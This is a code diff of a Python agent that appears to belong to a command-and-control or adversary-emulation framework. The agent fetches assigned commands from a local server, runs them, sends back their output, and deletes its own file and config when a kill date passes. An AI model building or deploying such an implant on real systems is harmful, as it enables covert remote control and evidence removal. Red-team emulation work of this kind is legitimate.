@@ -27,21 +27,20 @@ def config_file():
     # None was converted to a string
     if kill_date_string != 'None':
 
-        new_kill_date = datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M:%S')
         config.read('config.ini')
         if 'kill_date' in config['AGENT']:
 
             # Check if current kill date is different from the one stored so that we change it
             if config['AGENT']['kill_date'] != kill_date_string:
-                print('[+] New Agent Kill Date')
-                print('[+] %s' % kill_date_string)
+                print('[+] Agent received new kill date')
+                print(kill_date_string)
                 config['AGENT'] = {'id': agent_id,
-                                   'kill_date': new_kill_date}
+                                   'kill_date': kill_date_string}
                 with open('config.ini', 'w') as configfile:
                     config.write(configfile)
         else:
             config['AGENT'] = {'id': agent_id,
-                               'kill_date': new_kill_date}
+                               'kill_date': kill_date_string}
             with open('config.ini', 'w') as configfile:
                 config.write(configfile)
 
@@ -53,6 +52,7 @@ def config_file():
 
     # Other runs
     else:
+        config.read('config.ini')
         if 'kill_date' in config['AGENT']:
             confirm_kill()
 
@@ -102,6 +102,8 @@ def get_techniques():
     url = ('http://localhost:8000/agent_techniques/%s' % agent_id)
     req = http.request('GET', url, headers=headers)
     response = str(req.data.decode('utf-8'))
+    if ':' not in response or ',' not in response:
+        return
     # print('Response code: ' + str(req.status))
     # print('Response: ' + response)
     response = response.split(',')
@@ -123,6 +125,8 @@ def download_and_run_commands():
     req = http.request('GET', url, headers=headers)
     response = str(req.data.decode('utf-8'))
     response_code = req.status
+    if ';' not in response:
+        return
     # print('Response code: ' + str(req.status))
     # print('Response: ' + response)
 
@@ -148,6 +152,11 @@ def send_output():
     # url = 'http://localhost:8000/agent_tasks/5'
     agent_tech = get_techniques()
     # http://localhost:8000/agent_techniques/5
+
+    if agent_tech is None or std_out is None:
+        print('[+] Agent received an error from the server')
+        return
+
     url = 'http://localhost:8000/agent_output'
 
     # Iterates over list of techniques assigned to an agent_tasks while selecting the respective result or output after
@@ -170,16 +179,20 @@ def send_output():
 
 
 def confirm_kill():
-    check = configparser.ConfigParser()
-    check.read('config.ini')
-
-    kill_date = check['AGENT']['kill_date']
-
+    # check = configparser.ConfigParser()
+    # check.read('config.ini')
+    #
+    # kill_date = check['AGENT']['kill_date']
+    #
     now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
-    if now > kill_date:
+    # if now > kill_date_string:
+    # if now > kill_date:
+    if now > kill_date_string:
         path = Path(__file__)
         os.remove(path)
+
+        if os.path.exists(path=THIS_DIR / 'config.ini'):
+            os.remove(THIS_DIR / 'config.ini')
 
 
 # def form():
@@ -228,4 +241,4 @@ if __name__ == '__main__':
     # print(results)
     register()
     send_output()
-    config_file()
+    # config_file()
